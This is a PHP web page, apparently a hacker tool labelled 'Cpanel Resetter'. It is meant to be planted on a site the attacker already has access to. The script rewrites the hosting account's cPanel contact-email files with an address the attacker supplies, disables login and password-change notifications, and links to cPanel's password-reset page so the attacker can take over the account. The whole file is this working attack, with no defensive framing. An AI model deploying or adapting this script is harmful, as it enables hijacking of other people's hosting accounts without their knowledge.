<!doctype html>
<html lang="en">
  <head>

    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="canonical" href="https://getbootstrap.com/docs/4.4/examples/floating-labels/">
    <link href="https://getbootstrap.com/docs/4.4/examples/floating-labels/floating-labels.css" rel="stylesheet">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <link rel="icon" type="image/png" href="https://developer.mozilla.org/static/img/opengraph-logo.72382e605ce3.png"/>
    <title>Cpanel Reset Password</title>

    <style>
      .bd-placeholder-img {
        font-size: 1.125rem;
        text-anchor: middle;
        -webkit-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }

      @media (min-width: 768px) {
        .bd-placeholder-img-lg {
          font-size: 3.5rem;
        }
      }
    </style>
  </head>
  <body>

    <form class="form-signin" enctype="multipart/form-data" action="" method="POST">
        <div class="text-center mb-4">
          <h1 class="h3 mb-3 font-weight-normal">Cpanel Resetter</h1>
        </div>
        <div class="card border-info mb-3">
          <div class="card-body text-info">
            <h5 class="card-title">About this Script:~</h5>
            <p class="card-text">
             You can reset Cpanel Password, if you have access to site target.
            </p>
          </div>
        </div>

<?php
##########################################################################
#     Coded by Jse
#     01-22-2020
#     at localhost
##########################################################################

if(isset($_POST['email']) && isset($_POST['execute'])){
  $usr = get_current_user();
  $site = $_SERVER['HTTP_HOST'];
  $ips = getenv('REMOTE_ADDR');
  $email = $_POST['email'];
  $wr = 'email:' . $email;
  $incp = '
"email": \''.$email.'\'
"ip": \'127.0.0.1\'
"notify_account_authn_link": 1
"notify_account_authn_link_notification_disabled": 1
"notify_account_login": 0
"notify_account_login_for_known_netblock": 0
"notify_account_login_notification_disabled": 1
"notify_contact_address_change": 1
"notify_contact_address_change_notification_disabled": 1
"notify_disk_limit": 1
"notify_email_quota_limit": 1
"notify_password_change": 1
"notify_password_change_notification_disabled": 1
"origin": \'cpanel\'
"pushbullet_access_token": \'\'
"second_email": \'\'';

$path1 = "/home/".$usr."/.cpanel/contactinfo";
$path2 = "/home/".$usr."/.contactinfosss";
$path3 = "/home/".$usr."/.contactemail";
if (!file_exists($path1)){
    $error1 = "warning";
    $msg_error1 = "File does not exist.";
            echo '<div class="alert alert-'.$error1.'">
                  <strong>Failed!</strong> <code>"'.$path3.'"</code> '.$msg_error.'.
                  </div>';
}else if (!file_exists($path3)) {
    $error2 = "warning";
    $msg_error2 = "File does not exist.";
            echo '<div class="alert alert-'.$error2.'">
                  <strong>Failed!</strong> <code>"'.$path3.'"</code> '.$msg_error.'.
                  </div>';
}else if (!file_exists($path3)){
    $error3 = "warning";
    $msg_error3 = "File does not exist.";
            echo '<div class="alert alert-'.$error3.'">
                  <strong>Failed!</strong> <code>"'.$path3.'"</code> '.$msg_error.'.
                  </div>';
} else {

  $f =  fopen($path1, 'w');
        $cek1 = fwrite($f, $incp);
        if($cek1){
          $ucpci        = "success";
          $msg_ucpci    = "<code>\"/home/".$usr."/.cpanel/contactinfo\"</code> Email was Successfully Changed to <code>".$email.".</code>";
        }
        fclose($f);
  
  $f =  fopen($path2, 'w');
        $cek2 = fwrite($f, $wr);
        $res = fclose($f);
        if ($res) {
          $uci        = "success";
          $msg_uci    = "<code>\"/home/".$usr."/contactinfo\"</code> Email Successfully Changed to <code>".$email.".</code>";
        }
  $f =  fopen($path3, 'w');
        $contactemail = fwrite($f, $email);
        $res = fclose($f);
        if ($contactemail) {
          $uce        = "success";
          $msg_uce    = "<code>\"/home/".$usr."/contactemail\"</code> Email Successfully Changed to <code>".$email.".</code>";
        }

          if ( $ucpci == "success" && $uci == "success" && $uce == "success" ) {
            echo '<div class="alert alert-'.$ucpci.'">
                  <strong>Success!</strong> <small>'.$msg_ucpci.'</small>.
                  </div>';
            echo '<div class="alert alert-'.$uci.'">
                  <strong>Success!</strong> <small>'.$msg_uci.'</small>.
                  </div>';
            echo '<div class="alert alert-'.$uce.'">
                  <strong>Success!</strong> <small>'.$msg_uce.'</small>.
                   </div>';
            echo '
                  <strong>URL : - Choose One -</strong> 
                  <div class="list-group mb-3">
                  <a href="http://'.$site.':2083/resetpass=1" target="_blank" class="list-group-item list-group-item-action active">http://'.$site.':2083/resetpass=1</a>
                  <a href="https://'.$site.':2083/resetpass=1" target="_blank" class="list-group-item list-group-item-action">https://'.$site.':2083/resetpass=1</a>
                  </div>';
          } else {
            echo '<div class="alert alert-primary">
                  <strong>Failed!</strong> Unknown.
                </div>';
          }
        }
}
?>

        <div class="form-group mb-3">
          <input type="email" id="inputEmail" name="email" class="form-control" placeholder="email" <?php if(isset($_POST['email'])){ $email = $_POST['email']; echo ' value="'.$email.'" '; }?> required>
        </div>
        <button class="btn btn-lg btn-primary btn-block" type="submit" name="execute">Execute</button>
        <p class="mt-5 mb-3 text-muted text-center">Coded by ./Jse with <ion-icon md="md-heart"></ion-icon> - &copy; <?= date('Y');?></p>
    </form>

    <script src="https://code.jquery.com/jquery-3.4.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js"></script>
    <script type="module" src="https://unpkg.com/ionicons@4.5.10-0/dist/ionicons/ionicons.esm.js"></script>
  </body>
</html>
